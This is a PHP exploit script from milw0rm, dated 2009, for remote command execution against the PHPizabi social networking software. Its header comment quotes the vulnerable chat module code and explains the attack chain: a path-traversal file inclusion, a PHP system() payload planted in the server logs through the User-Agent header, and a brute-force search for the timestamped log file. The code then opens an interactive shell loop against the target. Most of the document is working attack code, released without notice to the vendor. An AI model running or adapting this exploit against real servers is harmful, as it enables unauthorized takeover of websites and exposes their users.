#!/usr/bin/php
<?php
/* Found this after getting my inet back and noticing this http://www.milw0rm.com/exploits/6085 .  The only problem with the 
remote command execution there is that it actually requires register_globals = on.  I saw the GLOBAL keyword, and actually 
believed this populated those varibles some other way such as cookies or something ie register globals isnt needed.  
Anyway, while getting back into the code i found a nice LFI and put this together.  Remote command execuation using an 
lfi and log file pollution using the User-Agent string.  This works with register_globals = off and php 5.

To quote phpizabi homepage on the first command execution exploit:

A security vulnerability recently discovered in PHPizabi originally reported by a local administrator has been confirmed and published by the National Vulnerability Database service of the National Institute of Standards and Technology (NIST) and the DHS National Cyber Security Division (US-CERT) in the National Cyber-Alert CVE-2008-3239 . Due to the great visibility of the NVD/NIST portal which disclosed this information, there have been a number of attacks against PHPizabi websites.
Tough we do not intend to release a security fix for this issue at this time, we want to remind our users of the importance of disabling the "REGISTER_GLOBALS" option of their system. This option will not only enable this vulnerability to be exploited but will also open multiple breaches into your system. Note that if your system is configured properly (with "REGISTER_GLOBALS" disabled), this vulnerability does not apply to your website.
Please read through the documentation at PHP.Net to check if your system is configured properly. Contact your system administrator to take appropriate actions in order to void this vulnerability if your system has the "REGISTER_GLOBALS" option enabled.
This vulnerability affects all versions of PHPizabi 0.8 to HFP3 SF1 (included). There is no security fix pack release planned at this time.

Funny those guys never even responded to or acknowledged my database information disclosure from here: 
http://www.milw0rm.com/exploits/5506 which is just as serious IMO as command execution, because anyone good will get there anyway ;).
Anyway, time to totally destroy their hopes of an easy "cut off register_globals" fix.  Wanted to add i did NOT 
let the vendor know of this one before hand, last time i gave them 48+ hours and still to this day havent recieved 
even a response from them.  If i have the time to waste look for a c port to this soon.  My C is bad =/.  */

#vulnerable code   modules/chat/dac.php
#
#	function handleSendChatData($data) {
#		if (substr($data, 0, 1) == "/") return $this -> handleChatCommand($data, $this -> channel);     # This line right here says if the string
#														# begins with / it is a command so treat
#														# as one and call handleChatCommand
#
#
#
#       function handleChatCommand($data, $channel) {
#			/* /! is a call to the last called command ... handle it */
#			if (substr($data, 1, 1) == "!" and isset($_SESSION["triton"]["lastcommand"]))
#				$data = $_SESSION["triton"]["lastcommand"];
#
#			/* Convert illegal character entities */
#			$entities = array(";"=>"&#059;", "\""=>"&quot;", "'"=>"&#039;", "<"=>"&lt;", ">"=>"&gt;", "\\"=>"&#092;", "^"=>"&#094;");
#			$data = strtr(stripslashes($data), $entities);
#
#			$commandArgs = explode(" ", substr($data, 1));                                                              # commandArgs is set using data which hasnt sanitized.
#			if (is_file("commands/".$commandArgs[0].".php") and @include("commands/".$commandArgs[0].".php")) {         # commands are stored in their own files and included each call to them.
#				$_SESSION["triton"]["lastcommand"] = $data;
#				t_command::runCommand($commandArgs, $channel);
#			}
#			else $this -> localEcho('ERR_NOCOMMAND', array($commandArgs[0]));
#		} */
#
#
#	So the lfi works by calling PATH/modules/chat/dac.php?sendChatData=/../../../PATHTOFILETOINCLUDE\0
#	since phpizabi strips images of all comments when uploaded, had to get creative to get this to work :)
#	i handled this by noticing that phpizabi logs the user-agent of each request in PATH/system/cache/logs.
#	That means by specifying a user-agent with phptags in it i can get my lfi to work nicely.
#	The only problem is that those log files are named based on a unix timestamp, and they update every 24 hours.
#	To deal with this, a request is made to the server to get the Date: header response, and this is converted to
#	a unix timestamp, and then it is walked by the hour 36 hours back, then 36 hours forward one hour at a time.
#	the phpcode echos a string when you have hit the proper log file, this tells us that it has found what is needed.
#
#	I am not responsible for the use of this code in any way shape or form.  Whatever you choose to do
#	with it is on you. Enjoy :)
#
#	comments, criticism should be emailed to icode00@gmail.com .   Got problems? Email them to icode00@gmail.com but dont expect a response. ;)


function usage()
{
	$usage="_________________________________________________________________\n\n";
	$usage.="	PHPizabi v0.848b C1 HFP1-3 Remote Command Execution 	  \n";
	$usage.="		by youcode	icode00@gmail.com		  \n";
	$usage.="_________________________________________________________________\n";
	$usage.="Usage: \n\n";
	$usage.=basename($_SERVER['PHP_SELF'])." HOST PATH  \n\n";
	$usage.="	HOST		remote host\n";
	$usage.="	PATH		path to phpizabi\n";
	die($usage);
}

function timestampStr($host,$path,$port=80)
{
	$packet="GET ".$path."index.php HTTP/1.0\r\n";
	$packet.="User-Agent: phpinj 0.1 <?php if(!isset(\$_GET['xyz']))die(\"FindThisTag-9203842398\");system(\$_GET['xyz']);die(); ?>\r\n";
	if(80==$port)
	{
		$packet.="Host: ".$host."\r\n";
	}else{
		$packet.="Host: ".$host.":".$port."\r\n";
	}
	$packet.="Connection: Close\r\n\r\n";
	$tmphostarr=gethostbynamel($host);
	if($tmphostarr===FALSE)
	{
		die("Failed to resolve hostname $host.\n");
	}
	$packetsent=0;
	foreach ($tmphostarr as $host)
	{
		$ock=fsockopen($host,$port);
		if(!$ock)
		{
			fclose($ock);
			continue;
		}
		fputs($ock,$packet);
		$packetsent=1;
		$response="";
		while (!feof($ock))
		{
			$response.=fgets($ock);
		}
		fclose($ock);
		if($packetsent)
			break;
	}
	if(!$packetsent)
		die("Failed to connect to $host.\nError: ".socket_strerror(socket_last_error($ock))."\n");
	$datePos=strpos($response,"Date:");
	$datePos+=6;
	$tmpbreakPos=strpos($response,"\r\n",$datePos);
	$breakPos=$tmpbreakPos-$datePos;
	$dateStr=substr($response,$datePos,$breakPos);
	$dateArr=explode(" ",$dateStr);
	$months = array ( "Jan" => 1, "Feb" => 2, "Mar" => 3, "Apr" => 4, "May" => 5, "Jun" => 6, "Jul" => 7, "Aug" => 8, "Sep" => 9, "Oct" => 10, "Nov" => 11, "Dec" => 12 );
	foreach($months as $key => $val){
		if(stripos($dateArr[2],$key)!==FALSE)
			$monthNumber=$val;
	}
	$tmphourArr=explode(":",$dateStr);
	if(is_array($tmphourArr))
	{
		$hour=substr($tmphourArr[0],-2,2);
		$timestampStr=mktime($hour,0,0,$monthNumber,$dateArr[1],$dateArr[3]);
	}else{
		$timestampStr=mktime();
	}
	return $timestampStr;
}

function findfilename($host,$path,$start,$mode=0,$port=80)
{
	$date=$start;
	$foundtag=0;
	$tmphostarr=gethostbynamel($host);
	if($tmphostarr===FALSE)
	{
		die("Failed to resolve hostname $host.\n");
	}
	for($i=0;$i<=36;$i++)
	{
		$packet="GET ".$path."modules/chat/dac.php?sendChatData=/../../../system/cache/logs/".$date.".log\\0 HTTP/1.0\r\n";
		$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
		if(80==$port)
		{
			$packet.="Host: ".$host."\r\n";
		}else{
			$packet.="Host: ".$host.":".$port."\r\n";
		}
		$packet.="Connection: Close\r\n\r\n";
		$packetsent=0;
		foreach ($tmphostarr as $remotehost)
		{
			$ock=fsockopen($remotehost,$port);
			if(!$ock)
			{
				fclose($ock);
				continue;
			}
			fputs($ock,$packet);
			$packetsent=1;
			$response="";
			while (!feof($ock))
			{
				$response.=fgets($ock);
			}
			fclose($ock);
			if($packetsent)
				break;
		}
		if(!$packetsent)
			die("Failed to connect to $host.\nError: ".socket_strerror(socket_last_error($ock))."\n");
		if((strpos($response,"FindThisTag-9203842398"))!==FALSE)
		{
			$foundtag=1;
			break;
		}
		if($mode==0)
		{
			$date-=3600;
		}else{
			$date+=3600;
		}
	}
	if($foundtag)
	{
		return $date;
	}else{
		return FALSE;
	}
}


if($argc < 3)
	usage();
$hoststring=$argv[1];
$path=$argv[2];
$date=timestampStr($hoststring,$path);
echo "timestamp is $date.  Using this as start point and attempting to locate log file.\n";
$remotelog=findfilename($hoststring,$path,$date);
if(!$remotelog)
	$remotelog=findfilename($hoststring,$path,$date,1);
if(!$remotelog)
	die("Failed to find the log file name.  Cant include a file that cant be found :(\n");
echo "Found log file: $remotelog.log\nBeginning command execution. . .\n";
$tmpportarr=explode(":",$hoststring);
if(isset($tmpportarr[1]))
{
	$hoststring=$tmpportarr[0];
	$remoteport=$tmpportarr[1];
}else{
	$remoteport=80;
}
$tmphostarr=gethostbynamel($hoststring);
if($tmphostarr===FALSE)
{
	die("Failed to resolve hostname $hoststring.\n");
}
for(;;)
{
	echo "#> ";
	$cmd=urlencode(fgets(STDIN));
	$packet="GET ".$path."modules/chat/dac.php?sendChatData=/../../../system/cache/logs/".$remotelog.".log\\0&xyz=".$cmd." HTTP/1.0\r\n";
	$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
	if(80==$remoteport)
	{
		$packet.="Host: ".$hoststring."\r\n";
	}else{
		$packet.="Host: ".$hoststring.":".$remoteport."\r\n";
	}
	$packet.="Connection: Close\r\n\r\n";
	$packetsent=0;
	foreach ($tmphostarr as $remotehost)
	{
		$ock=fsockopen($remotehost,$remoteport);
		if(!$ock)
		{
			fclose($ock);
			continue;
		}
		fputs($ock,$packet);
		$packetsent=1;
		$response="";
		while (!feof($ock))
		{
			$response.=fgets($ock);
		}
		fclose($ock);
		if($packetsent)
			break;
	}
	if(!$packetsent)
	{
		echo "Failed to connect to $hoststring.\nError: ".socket_strerror(socket_last_error($ock))."\n";
		break;
	}
	$cmdOutput=strstr($response,"phpinj 0.1 ");
	$cmdOutput=str_replace("phpinj 0.1 ","",$cmdOutput);
	echo "\n\n$cmdOutput\n\n";
}

?>

# milw0rm.com [2009-03-23]